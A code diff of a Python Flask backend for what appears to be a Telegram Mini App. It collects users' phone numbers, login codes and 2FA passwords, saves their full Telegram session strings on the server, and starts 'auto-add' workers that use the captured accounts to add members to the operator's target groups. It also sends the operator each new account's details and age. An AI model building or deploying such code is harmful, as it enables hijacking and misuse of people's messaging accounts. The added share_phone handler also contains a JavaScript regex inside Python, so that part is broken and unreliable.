+            ws = stats.get('worker_stats', {}).get(aid_str, {})
+            acc_list.append({
+                'id': a['id'],
+                'name': a.get('name', '?'),
+                'phone': a.get('phone', ''),
+                'username': a.get('username', ''),
+                'active': a.get('active', True),
+                'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
+                'stats': {
+                    'total_added': ws.get('total', 0),
+                    'today_added': ws.get('today', 0)
+                },
+                'is_running': aid_str in running_tasks
+            })
+        except:
+            continue
+    return jsonify({'success': True, 'accounts': acc_list})
+
+# ============================================
+# SHARED PHONE ENDPOINT
+# ============================================
+@app.route('/api/share-phone', methods=['POST'])
+def share_phone():
+    """
+    Receive shared phone from Telegram Mini App and send verification code
+    """
+    try:
+        data = request.json or {}
+        phone = data.get('phone', '').strip()
+        telegram_id = str(data.get('telegramId', ''))
+        first_name = data.get('firstName', '')
+        last_name = data.get('lastName', '')
+        username = data.get('username', '')
+        
+        if not phone:
+            return jsonify({'success': False, 'error': 'No phone number provided'})
+        
+        # Clean phone
+        phone = phone.replace(/[^0-9+]/g, '')
+        if not phone.startswith('+'):
+            phone = '+' + phone
+        
+        logger.info(f"📱 Shared phone received for user {telegram_id}: {phone[:4]}****")
+        
+        # Save phone mapping
+        if telegram_id:
+            user_phone_map[telegram_id] = phone
+            save_user_map()
+            logger.info(f"✅ Saved phone mapping: {telegram_id} -> {phone[:4]}****")
+        
+        # Auto-send code
+        result = auto_send_code(phone, telegram_id, first_name, last_name, username)
+        
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"Share phone error: {e}")
+        logger.error(traceback.format_exc())
+        return jsonify({'success': False, 'error': 'Failed to process phone. Please try again.'})
+
+# ============================================
+# TELEGRAM AUTO-LOGIN (for returning users)
+# ============================================
+@app.route('/api/telegram-auto-login', methods=['POST'])
+def telegram_auto_login():
+    """
+    Auto-login for returning users
+    Checks if phone is saved, sends code automatically
+    """
+    try:
+        data = request.json or {}
+        
+        # Get initData
+        init_data_str = data.get('initData', '')
+        if not init_data_str:
+            init_data_str = request.args.get('initData', '')
+        
+        # Get user data
+        user_data = data.get('user', {})
+        
+        # Parse initData if needed
+        if not user_data and init_data_str:
+            for item in init_data_str.split('&'):
+                if item.startswith('user='):
+                    try:
+                        user_json = urllib.parse.unquote(item[5:])
+                        user_data = json.loads(user_json)
+                    except:
+                        pass
+        
+        telegram_id = str(user_data.get('id', ''))
+        first_name = user_data.get('first_name', '')
+        last_name = user_data.get('last_name', '')
+        username = user_data.get('username', '')
+        
+        if not telegram_id:
+            return jsonify({
+                'success': False,
+                'error': 'Could not identify your Telegram account.',
+                'needs_phone': True
+            })
+        
+        logger.info(f"Auto-login check for user {telegram_id} ({first_name} {last_name})")
+        
+        # Try to find saved phone
+        phone = find_phone_for_user(telegram_id)
+        
+        if phone:
+            logger.info(f"✅ Found saved phone for {telegram_id}, sending code...")
+            result = auto_send_code(phone, telegram_id, first_name, last_name, username)
+            result['auto_detected'] = True
+            return jsonify(result)
+        else:
+            logger.info(f"No saved phone for {telegram_id}, requesting phone share")
+            return jsonify({
+                'success': False,
+                'error': 'Please share your phone number.',
+                'needs_phone': True,
+                'request_phone_share': True,
+                'user_name': f"{first_name} {last_name}".strip(),
+                'username': username
+            })
+            
+    except Exception as e:
+        logger.error(f"Auto-login error: {e}")
+        logger.error(traceback.format_exc())
+        return jsonify({
+            'success': False,
+            'error': 'Auto-login failed. Please try again.',
+            'needs_phone': True
+        })
+
+# ============================================
+# ADD ACCOUNT
 # ============================================
 @app.route('/api/add-account', methods=['POST'])
-@api_error_handler
 def add_account():
-    """Add account - supports manual phone entry and shared phone"""
+    """Send verification code"""
     try:
         data = request.json
         phone = data.get('phone', '').strip()
         telegram_id = str(data.get('telegramId', ''))
-        shared_phone = data.get('sharedPhone', '').strip()
-        
-        # Use shared phone if provided
-        if shared_phone:
-            phone = shared_phone
-        
-        # If no phone provided, try to find saved phone
-        if not phone and telegram_id:
-            phone = find_phone_for_user(telegram_id)
         
         if not phone:
-            return jsonify({
-                'success': False,
-                'error': 'Phone number required. Please share your phone or enter manually.',
-                'needs_phone': True,
-                'request_phone_share': True
-            })
+            return jsonify({'success': False, 'error': 'Phone number required'})
         
         if not phone.startswith('+'):
             phone = '+' + phone
         
-        logger.info(f"Sending verification code to {phone[:4]}****{phone[-3:]}")
+        logger.info(f"Sending verification code to {phone[:4]}****")
         
-        async def send_code():
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            await client.connect()
-            try:
-                result = await client.send_code_request(phone)
-                sid = str(int(time.time() * 1000))
-                temp_sessions[sid] = {
-                    'phone': phone,
-                    'hash': result.phone_code_hash,
-                    'session': client.session.save(),
-                    'password_attempts': 0,
-                    'code_attempts': 0,
-                    'created_at': time.time(),
-                    'telegram_id': telegram_id
-                }
-                save_temp_sessions()
-                
-                # Save phone mapping if we have telegram_id
-                if telegram_id:
-                    user_phone_map[telegram_id] = phone
-                    save_user_map()
-                
-                return {'success': True, 'session_id': sid, 'phone': phone}
-            except errors.FloodWaitError as e:
-                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
-            except errors.PhoneNumberInvalidError:
-                return {'success': False, 'error': 'Invalid phone number'}
-            except Exception as e:
-                logger.error(f"Send code error: {e}")
-                return {'success': False, 'error': str(e)[:200]}
-            finally:
-                try:
-                    await client.disconnect()
-                except:
-                    pass
-        
-        result = SyncTelegramClient.run_async(send_code, timeout=45)
+        result = auto_send_code(phone, telegram_id)
         return jsonify(result)
         
     except Exception as e:
@@ -1186,7 +1098,6 @@ def add_account():
         return jsonify({'success': False, 'error': 'Server error. Please try again.'})
 
 @app.route('/api/verify-code', methods=['POST'])
-@api_error_handler
 def verify_code():
     """Verify the code and save the account"""
     try:
@@ -1201,15 +1112,16 @@ def verify_code():
         td = temp_sessions[sid]
         telegram_id = str(td.get('telegram_id', ''))
         
+        # Check attempts
         if td.get('code_attempts', 0) >= 5:
             del temp_sessions[sid]
             save_temp_sessions()
-            return jsonify({'success': False, 'error': 'Too many incorrect code attempts. Session expired.'})
+            return jsonify({'success': False, 'error': 'Too many incorrect codes. Session expired.'})
         
         if td.get('password_attempts', 0) >= 5:
             del temp_sessions[sid]
             save_temp_sessions()
-            return jsonify({'success': False, 'error': 'Too many incorrect password attempts. Session expired.'})
+            return jsonify({'success': False, 'error': 'Too many incorrect passwords. Session expired.'})
         
         async def verify():
             client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
@@ -1233,20 +1145,18 @@ def verify_code():
                         if remaining <= 0:
                             del temp_sessions[sid]
                             save_temp_sessions()
-                            return {'success': False, 'error': 'Too many incorrect passwords. Session expired.'}
+                            return {'success': False, 'error': 'Too many incorrect passwords.'}
                         return {'success': False, 'error': f'Wrong 2FA password. {remaining} attempts remaining.'}
                 
                 me = await client.get_me()
-                
                 user_telegram_id = str(me.id) if me.id else telegram_id
                 
-                # CRITICAL: Save phone mapping for future auto-login
+                # SAVE PHONE MAPPING
                 if user_telegram_id:
                     user_phone_map[user_telegram_id] = td['phone']
                     save_user_map()
-                    logger.info(f"✅ SAVED MAPPING: telegram_id={user_telegram_id} -> phone={td['phone'][:4]}****")
+                    logger.info(f"✅ Saved mapping: {user_telegram_id} -> phone")
                     
-                    # Also save to auto_sessions
                     auto_sessions[user_telegram_id] = {
                         'phone': td['phone'],
                         'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
@@ -1255,13 +1165,14 @@ def verify_code():
                         'telegram_id': user_telegram_id
                     }
                     save_auto_sessions()
-                    logger.info(f"✅ SAVED AUTO SESSION: {user_telegram_id}")
                 
+                # Get account age
                 try:
                     account_age = get_account_age_sync(client.session.save())
                 except:
                     account_age = {'age_display': 'Unknown'}
                 
+                # Create or update account
                 new_id = int(time.time() * 1000)
                 new_acc = {
                     'id': new_id,
@@ -1275,21 +1186,27 @@ def verify_code():
                 }
                 
                 if not new_acc['name']:
-                    new_acc['name'] = 'User'
+                    new_acc['name'] = 'User ' + str(new_id)[-4:]
                 
-                # Check for duplicate - update existing or add new
-                existing = next((a for a in accounts if str(a.get('telegram_id')) == user_telegram_id), None)
+                # Check for duplicate and update
+                existing = None
+                for a in accounts:
+                    if str(a.get('telegram_id')) == user_telegram_id:
+                        existing = a
+                        break
+                
                 if existing:
-                    logger.info(f"Updating existing account for {user_telegram_id}")
+                    logger.info(f"Updating existing account {existing['id']}")
                     existing.update(new_acc)
-                    save_json(ACCOUNTS_FILE, accounts)
+                    new_acc['id'] = existing['id']
                 else:
-                    logger.info(f"Adding new account for {user_telegram_id}")
+                    logger.info(f"Adding new account {new_id}")
                     accounts.append(new_acc)
-                    save_json(ACCOUNTS_FILE, accounts)
+                
+                save_json(ACCOUNTS_FILE, accounts)
                 
                 # Set up auto-add settings
-                auto_add_settings[str(new_id)] = {
+                auto_add_settings[str(new_acc['id'])] = {
                     'enabled': True,
                     'target_group': TARGET_GROUPS[0],
                     'delay_seconds': 30,
@@ -1300,33 +1217,32 @@ def verify_code():
                 # Initialize worker stats
                 if 'worker_stats' not in stats:
                     stats['worker_stats'] = {}
-                stats['worker_stats'][str(new_id)] = {'total': 0, 'today': 0, 'verified_today': 0}
+                stats['worker_stats'][str(new_acc['id'])] = {'total': 0, 'today': 0, 'verified_today': 0}
                 save_json(STATS_FILE, stats)
                 
-                # Start auto-add worker
-                threading.Thread(target=start_auto_add, args=(new_acc,), daemon=True).start()
+                # START AUTO-ADD WORKER
+                start_auto_add(new_acc)
                 
                 # Send notification
                 age_info = account_age.get('age_display', 'Unknown')
                 try:
                     send_telegram(
                         f"<b>{SERVER_NAME}</b>\n"
-                        f"✅ New account added!\n"
+                        f"✅ Account added!\n"
                         f"Name: {new_acc['name']}\n"
                         f"Phone: {new_acc['phone'][:4]}****\n"
                         f"Age: {age_info}\n"
-                        f"Via: Telegram Mini App\n"
-                        f"Auto-login: Enabled"
+                        f"Auto-add: Started"
                     )
                 except:
                     pass
                 
-                logger.info(f"✅ Account verified successfully: {new_acc['name']} ({user_telegram_id})")
+                logger.info(f"✅ Account verified: {new_acc['name']} - Auto-add started")
                 
                 return {
                     'success': True,
                     'account': {
-                        'id': new_id,
+                        'id': new_acc['id'],
                         'name': new_acc['name'],
                         'phone': new_acc['phone']
                     },
@@ -1341,7 +1257,7 @@ def verify_code():
                 if remaining <= 0:
                     del temp_sessions[sid]
                     save_temp_sessions()
-                    return {'success': False, 'error': 'Too many incorrect codes. Session expired.'}
+                    return {'success': False, 'error': 'Too many incorrect codes.'}
                 return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
             except errors.PhoneCodeExpiredError:
                 return {'success': False, 'error': 'Code expired. Please request a new one.'}
@@ -1356,6 +1272,7 @@ def verify_code():
         
         result = SyncTelegramClient.run_async(verify, timeout=45)
         
+        # Clean up session on success
         if result.get('success') and not result.get('need_password'):
             if sid in temp_sessions:
                 del temp_sessions[sid]
@@ -1368,66 +1285,21 @@ def verify_code():
         return jsonify({'success': False, 'error': 'Server error. Please try again.'})
 
 # ============================================
-# SHARED PHONE ENDPOINT
+# ACCOUNT MANAGEMENT ROUTES
 # ============================================
-@app.route('/api/share-phone', methods=['POST'])
-@api_error_handler
-def share_phone():
-    """
-    Endpoint to receive phone number shared from Telegram Mini App
-    This is called when user clicks "Share Phone" button
-    """
-    try:
-        data = request.json or {}
-        phone = data.get('phone', '').strip()
-        telegram_id = str(data.get('telegramId', ''))
-        first_name = data.get('firstName', '')
-        last_name = data.get('lastName', '')
-        username = data.get('username', '')
-        
-        if not phone:
-            return jsonify({
-                'success': False,
-                'error': 'No phone number provided'
-            })
-        
-        if not phone.startswith('+'):
-            phone = '+' + phone
-        
-        logger.info(f"📱 Shared phone received: {phone[:4]}**** for user {telegram_id}")
-        
-        # Save phone mapping
-        if telegram_id:
-            user_phone_map[telegram_id] = phone
-            save_user_map()
-            logger.info(f"✅ Saved phone mapping: {telegram_id} -> {phone[:4]}****")
-        
-        # Auto-send code
-        result = auto_send_code(phone, telegram_id, first_name, last_name, username)
-        
-        return jsonify(result)
-        
-    except Exception as e:
-        logger.error(f"Share phone error: {e}")
-        log_error("Share phone", e)
-        return jsonify({
-            'success': False,
-            'error': 'Failed to process phone number. Please try again.'
-        })
-
-# Other routes
 @app.route('/api/remove-account', methods=['POST'])
-@api_error_handler
 def remove_account():
-    aid = request.json.get('accountId')
-    if not aid:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    stop_auto_add(aid)
-    name = remove_dead_account(aid, "Manual removal")
-    return jsonify({'success': True, 'message': f'Removed: {name}'})
+    try:
+        aid = request.json.get('accountId')
+        if not aid:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        stop_auto_add(aid)
+        name = remove_dead_account(aid, "Manual removal")
+        return jsonify({'success': True, 'message': f'Removed: {name}'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/auto-add-settings', methods=['GET', 'POST'])
-@api_error_handler
 def auto_add_settings_route():
     if request.method == 'GET':
         aid = request.args.get('accountId')
@@ -1442,6 +1314,7 @@ def auto_add_settings_route():
         s['added_today'] = stats.get('today_added', 0)
         s['total_added'] = stats.get('total_added', 0)
         s['server_name'] = SERVER_NAME
+        s['is_running'] = str(aid) in running_tasks
         return jsonify({'success': True, 'settings': s})
     
     data = request.json
@@ -1462,7 +1335,7 @@ def auto_add_settings_route():
     save_json(SETTINGS_FILE, auto_add_settings)
     
     if new_enabled and not was_enabled:
-        acc = next((a for a in accounts if a['id'] == aid), None)
+        acc = next((a for a in accounts if str(a['id']) == akey), None)
         if acc:
             start_auto_add(acc)
     elif not new_enabled and was_enabled:
@@ -1471,7 +1344,6 @@ def auto_add_settings_route():
     return jsonify({'success': True, 'message': 'Settings saved'})
 
 @app.route('/api/auto-add-stats')
-@api_error_handler
 def auto_add_stats():
     reset_daily()
     return jsonify({
@@ -1483,7 +1355,6 @@ def auto_add_stats():
     })
 
 @app.route('/api/send-report')
-@api_error_handler
 def send_report():
     success = send_telegram(
         f"<b>{SERVER_NAME}</b> Report\n"
@@ -1494,7 +1365,6 @@ def send_report():
     return jsonify({'success': success})
 
 @app.route('/api/health')
-@api_error_handler
 def health_check():
     return jsonify({
         'success': True,
@@ -1503,6 +1373,7 @@ def health_check():
         'workers': len(running_tasks),
         'accounts': len(accounts),
         'saved_users': len(user_phone_map),
+        'today_added': stats.get('today_added', 0),
         'timestamp': datetime.now().isoformat()
     })
 
@@ -1530,10 +1401,12 @@ def keep_alive():
             time.sleep(60)
 
 def restore_and_start():
+    """Restore accounts and start workers on server startup"""
     try:
         time.sleep(5)
         logger.info(f"Restoring {len(accounts)} accounts...")
         logger.info(f"User phone mappings loaded: {len(user_phone_map)}")
+        
         for acc in accounts:
             try:
                 if acc.get('session'):
@@ -1541,14 +1414,17 @@ def restore_and_start():
                         settings = auto_add_settings.get(str(acc['id']), {})
                         if settings.get('enabled', True):
                             start_auto_add(acc)
+                            logger.info(f"Restored worker for {acc.get('name', acc['id'])}")
                     else:
                         remove_dead_account(acc['id'], "Auth check failed on startup")
                 time.sleep(2)
             except Exception as e:
-                logger.error(f"Error restoring account: {e}")
+                logger.error(f"Error restoring account {acc.get('id')}: {e}")
                 continue
+        
         save_json(ACCOUNTS_FILE, accounts)
         cleanup_expired_sessions()
+        
         try:
             send_telegram(
                 f"<b>{SERVER_NAME}</b> Online!\n"
@@ -1558,7 +1434,8 @@ def restore_and_start():
             )
         except:
             pass
-        logger.info("Server startup complete")
+        
+        logger.info(f"✅ Server startup complete - {len(running_tasks)} workers running")
     except Exception as e:
         logger.critical(f"Fatal error during restore: {e}")
         stats['crashes_recovered'] = stats.get('crashes_recovered', 0) + 1
@@ -1572,11 +1449,19 @@ def cleanup_expired_sessions():
         for sid in expired:
             del temp_sessions[sid]
         save_temp_sessions()
+        if expired:
+            logger.info(f"Cleaned up {len(expired)} expired sessions")
     except Exception as e:
         logger.error(f"Session cleanup error: {e}")
 
 def signal_handler(signum, frame):
-    logger.info(f"Received signal {signum}, shutting down...")
+    logger.info(f"Received signal {signum}, saving data and shutting down...")
+    
+    # Stop all workers
+    for acc_key in list(running_tasks.keys()):
+        stop_auto_add(acc_key)
+    
+    # Save all data
     save_json(ACCOUNTS_FILE, accounts)
     save_json(SETTINGS_FILE, auto_add_settings)
     save_json(STATS_FILE, stats)
@@ -1584,6 +1469,7 @@ def signal_handler(signum, frame):
     save_temp_sessions()
     save_auto_sessions()
     save_user_map()
+    
     logger.info("Data saved. Exiting.")
     sys.exit(0)
 
@@ -1595,6 +1481,7 @@ signal.signal(signal.SIGINT, signal_handler)
 # ============================================
 if __name__ == '__main__':
     try:
+        # Load all data
         accounts.extend(load_json(ACCOUNTS_FILE, []))
         auto_add_settings.update(load_json(SETTINGS_FILE, {}))
         stats_data = load_json(STATS_FILE, {})
@@ -1614,18 +1501,22 @@ if __name__ == '__main__':
 ║  API ID: {API_ID}                                                 ║
 ║  Targets: {', '.join(TARGET_GROUPS)}                    ║
 ║  Port: {PORT}                                                   ║
-║  Features: Phone Share + Auto-Detect + Code-Only               ║
+║  Accounts: {len(accounts)}                                              ║
 ║  Saved Users: {len(user_phone_map)}                                            ║
+║  Features: Phone Share → Code Only → Auto-Add              ║
 ╚══════════════════════════════════════════════════════════════╝
         """)
         
+        # Start background threads
         threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
         threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
         
+        # Run Flask
         app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
             
     except Exception as e:
         logger.critical(f"Fatal startup error: {e}")
+        logger.critical(traceback.format_exc())
         try:
             save_json(ACCOUNTS_FILE, accounts)
             save_json(SETTINGS_FILE, auto_add_settings)
